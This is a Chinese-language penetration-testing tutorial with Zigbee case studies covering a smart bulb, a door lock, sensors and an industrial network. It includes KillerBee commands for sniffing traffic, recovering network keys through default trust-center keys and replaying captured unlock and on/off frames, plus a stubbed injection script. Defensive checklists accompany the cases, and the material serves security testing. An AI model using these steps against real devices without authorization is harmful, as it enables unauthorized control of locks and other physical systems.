# Zigbee实战案例

### 6.1 案例1：智能家居灯泡渗透测试（从嗅探到控制）

**目标设备**：某品牌Zigbee智能灯泡 + Zigbee网关
**测试目标**：从被动嗅探开始，最终实现对灯泡的无线控制

#### 6.1.1 环境准备

**硬件**：
- CC2531 USB Dongle x2（一个嗅探，一个注入）
- 目标智能灯泡 x1
- 目标Zigbee网关 x1
- 无线环境：室内，距离约3米

**软件**：
- Kali Linux 2024.x
- KillerBee工具集
- Wireshark

#### 6.1.2 步骤1：网络发现

```bash
# 扫描附近Zigbee网络
zbstumbler -c 11-26 -v

# 输出（示例）：
# [+] Beacon Response on channel 15
#     PAN ID: 0xABCD
#     Extended PAN: 00:12:4B:00:AA:BB:CC:DD
#     Coordinator: 0x0000
#     Stack Profile: ZigBee Pro
#     Device Type: Coordinator
#     Security: Enabled
```

**分析**：
- 目标网络在信道15
- PAN ID: 0xABCD
- 已启用安全加密

#### 6.1.3 步骤2：被动嗅探与设备发现

```bash
# 在信道15上捕获流量
zbdump -c 15 -i 0 -w bulb_sniff.pcap -v

# 等待几分钟，让用户操作灯泡（开关、调光）
# 同时记录用户操作时间点，方便后续分析
```

**在Wireshark中分析**：

```
# 打开捕获文件
wireshark bulb_sniff.pcap

# 查看网络中的设备地址
# 过滤器：zbee_nwk

# 统计设备列表
# 从源地址和目的地址中提取唯一值
```

**发现的设备**：
- 协调器：0x0000（网关）
- 灯泡：0x1234（通过通信特征识别）
- 其他设备：0x5678、0x9ABC等

#### 6.1.4 步骤3：获取网络密钥

**方法A：利用设备重新加入过程**

```bash
# 1. 开始捕获
zbdump -c 15 -i 0 -w join_process.pcap &

# 2. 物理重启灯泡（拔插电源）
#    灯泡重启后会重新加入网络

# 3. 等待加入完成后停止捕获
kill %1

# 4. 使用zbgoodfind查找网络密钥
zbgoodfind -f join_process.pcap

# 输出（示例）：
# [+] Found Transport Key frame at packet 42
# [+] Trying TC link key: ZigBeeAllianceDefault
# [+] SUCCESS! Network key: 01030507090b0d0f00020406080a0c0d
# [+] Decrypted with TC link key: 5A6967426565416C6C69616E63653039
```

**方法B：使用默认密钥字典**

如果设备使用厂商默认密钥：

```bash
zbgoodfind -f bulb_sniff.pcap -k vendor_default_keys.txt
```

**结果**：成功获取网络密钥 `01030507090b0d0f00020406080a0c0d`

#### 6.1.5 步骤4：解密通信并分析命令

在Wireshark中配置网络密钥：

1. Edit → Preferences → Protocols → ZigBee
2. 添加网络密钥：`01030507090b0d0f00020406080a0c0d`
3. 应用后即可看到解密后的APS和ZCL层

**分析灯泡控制命令**：

```
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0006

# 找到On命令和Off命令
# On命令特征：
#   - Cluster: 0x0006 (On/Off)
#   - Command: 0x01 (On)
#   - 方向: Client → Server

# Off命令特征：
#   - Cluster: 0x0006 (On/Off)
#   - Command: 0x00 (Off)
```

记录关键信息：
- 灯泡网络地址：0x1234
- 灯泡端点：0x01
- 网关源地址：0x0000
- 网关源端点：0x01
- Profile ID：0x0104（Home Automation）

#### 6.1.6 步骤5：重放攻击测试

```bash
# 在Wireshark中找到一个On命令的帧号（假设是第156帧）

# 重放On命令
zbreplay -f bulb_sniff.pcap -c 15 -i 1 --frame 156 -n 1

# 观察灯泡是否亮起
# 如果亮起 → 重放攻击成功，设备不检查帧计数器
```

**测试结果**：灯泡成功被控制，重放攻击有效。

#### 6.1.7 步骤6：命令注入攻击（主动控制）

在确认网络密钥后，可以构造自定义命令直接控制设备：

```python
#!/usr/bin/env python3
"""
智能灯泡控制脚本
构造并发送ZCL On/Off命令
"""

from killerbee import KillerBee
import struct

# 网络配置
CHANNEL = 15
PAN_ID = 0xABCD
NWK_KEY = bytes.fromhex('01030507090b0d0f00020406080a0c0d')

# 目标设备
BULB_ADDR = 0x1234
BULB_EP = 0x01
ATTACKER_ADDR = 0xABCD  # 伪造的源地址
ATTACKER_EP = 0x01

def control_bulb(kb, on=True):
    """控制灯泡开关"""
    # 完整的帧构造需要：
    # 1. 构造802.15.4数据帧
    # 2. 构造NWK层（含安全头）
    # 3. 构造APS层
    # 4. 构造ZCL On/Off命令
    # 5. 使用网络密钥加密NWK载荷
    # 6. 发送
    
    cmd = 0x01 if on else 0x00
    action = "打开" if on else "关闭"
    print(f"[*] {action}灯泡 (地址: 0x{BULB_ADDR:04X}, 端点: {BULB_EP})")
    
    # ... 实际帧构造和加密逻辑 ...
    # 注：完整实现需要处理AES-CCM加密和帧计数器
    # 可以使用zbscapy或自定义加密函数实现
    
    # kb.inject(packet_bytes)
    print("[+] 命令已发送")

if __name__ == "__main__":
    kb = KillerBee()
    kb.open(device=1)
    kb.set_channel(CHANNEL)
    
    try:
        # 开灯
        control_bulb(kb, on=True)
        import time
        time.sleep(2)
        
        # 关灯
        control_bulb(kb, on=False)
    finally:
        kb.close()
```

#### 6.1.8 案例总结

| 测试项 | 结果 | 风险等级 |
|--------|------|----------|
| 默认密钥使用 | 是（全局默认TC密钥） | 高危 |
| 网络密钥可获取 | 是（通过嗅探加入过程） | 高危 |
| 重放攻击 | 成功 | 高危 |
| 命令注入 | 可行 | 高危 |
| APS加密 | 未使用 | 中危 |
| 帧计数器检查 | 未检查 | 高危 |

**安全建议**：
- 使用唯一的信任中心链接密钥
- 启用APS层端到端加密
- 严格检查帧计数器
- 使用安装代码进行设备认证

### 6.2 案例2：智能门锁Zigbee协议分析

**目标设备**：某品牌Zigbee智能门锁
**测试目标**：评估门锁的Zigbee通信安全性

#### 6.2.1 侦察阶段

```bash
# 发现门锁所在网络
zbstumbler -c 11-26

# 持续嗅探，记录门锁通信特征
zbdump -c 20 -i 0 -w lock_traffic.pcap -v
```

#### 6.2.2 安全机制分析

**分析要点**：
1. 是否使用默认TC密钥？
2. 是否启用APS加密？
3. 帧计数器是否严格检查？
4. 门锁命令是否有额外认证？

```bash
# 尝试获取网络密钥
zbgoodfind -f lock_traffic.pcap

# 结果1：如果默认密钥失败 → 使用了唯一TC密钥（好）
# 结果2：如果成功获取 → 安全问题严重
```

**APS加密检测**：

在Wireshark中观察门锁相关数据包：
- 如果APS层有安全头 → 使用了APS加密
- 如果只有NWK加密 → 安全性较低

#### 6.2.3 重放攻击测试

```bash
# 捕获开门操作时的数据包
# （需要用户配合使用APP/指纹开门）

# 尝试重放开门命令
zbreplay -f lock_open.pcap -c 20 -i 1

# 观察门锁是否打开
```

**预期结果**：
- 高质量门锁：重放失败（APS加密+严格计数器）
- 低质量门锁：重放成功（仅NWK加密）

#### 6.2.4 案例总结

智能门锁的安全等级差异很大：
- **高端门锁**：APS加密 + 唯一密钥 + 严格重放保护
- **低端门锁**：仅NWK加密 + 默认密钥 + 无重放保护

**门锁安全检查清单**：
- [ ] 是否使用唯一TC链接密钥
- [ ] 是否启用APS端到端加密
- [ ] 帧计数器是否单调递增且严格校验
- [ ] 是否使用安装代码认证
- [ ] 开锁命令是否有额外的PIN/认证码

### 6.3 案例3：温湿度传感器数据篡改

**目标设备**：Zigbee温湿度传感器
**测试目标**：验证传感器数据是否可被篡改

#### 6.3.1 数据分析

温湿度传感器通常周期性上报数据：

```bash
# 捕获传感器数据上报
zbdump -c 15 -i 0 -w sensor_data.pcap

# 在Wireshark中分析
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0402  # Temperature Measurement
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0405  # Relative Humidity
```

**数据上报特征**：
- 周期：通常每30秒~5分钟上报一次
- 方向：传感器 → 协调器/网关
- 集群：Temperature Measurement (0x0402)、Relative Humidity (0x0405)
- 属性：MeasuredValue（测量值）

#### 6.3.2 数据篡改攻击

**攻击场景**：攻击者伪造传感器数据上报，欺骗网关/平台。

```python
#!/usr/bin/env python3
"""
传感器数据篡改示例
伪造温湿度上报数据
"""

# 攻击前提：
# 1. 已获取网络密钥
# 2. 知道传感器的网络地址和端点
# 3. 知道数据上报的格式和周期

# 攻击方式：
# - 注入伪造的属性上报命令
# - 网关接收到伪造数据后更新显示
# - 可能触发错误的自动化规则（如空调控制）

# 风险评估：
# - 家庭场景：中等（误导用户、影响自动化）
# - 工业/医疗场景：高危（可能导致设备故障或人身伤害）

print("传感器数据篡改攻击演示 - 详见文档说明")
```

#### 6.3.3 防御建议

- 传感器数据应使用APS加密
- 网关注入设备白名单验证
- 数据异常值检测（如温度突然跳变）
- 周期性设备身份认证

### 6.4 案例4：工业Zigbee网络安全评估

**场景**：工业现场Zigbee传感器网络（温度、压力、流量监测）
**目标**：全面评估工业Zigbee网络的安全状况

#### 6.4.1 评估流程

```
1. 前期准备
   ├── 确认测试范围和授权
   ├── 准备测试设备（多个CC2531 + HackRF + 天线）
   └── 制定测试计划

2. 侦察阶段
   ├── 频谱分析（确认频段和信道）
   ├── 网络发现（PAN ID、协调器位置）
   ├── 设备枚举（传感器数量和类型）
   └── 流量模式分析（通信周期、数据量）

3. 安全测试
   ├── 密钥安全测试（默认密钥、密钥强度）
   ├── 重放攻击测试
   ├── 注入攻击测试
   ├── 拒绝服务测试
   └── 设备加入测试

4. 报告输出
   ├── 风险等级评估
   ├── 漏洞详情
   └── 整改建议
```

#### 6.4.2 工业环境特殊考量

1. **物理安全**：工业设备通常分布广泛，部分设备可能在公共区域
2. **可用性优先**：DoS攻击可能导致生产事故，需谨慎测试
3. **设备多样性**：工业Zigbee设备可能来自多家厂商，安全水平参差不齐
4. **协议变种**：部分工业场景使用私有协议扩展
5. **网关安全**：Zigbee网关通常连接工业网络，是重要的攻击跳板

#### 6.4.3 典型发现

工业Zigbee网络常见安全问题：
- 大量使用默认密钥（厂商配置不当）
- 网络密钥长期不更换
- 无设备身份认证（白名单）
- 传感器数据明文传输或仅NWK加密
- 无入侵检测和监控
- 设备固件无法更新或更新机制不安全

---

---

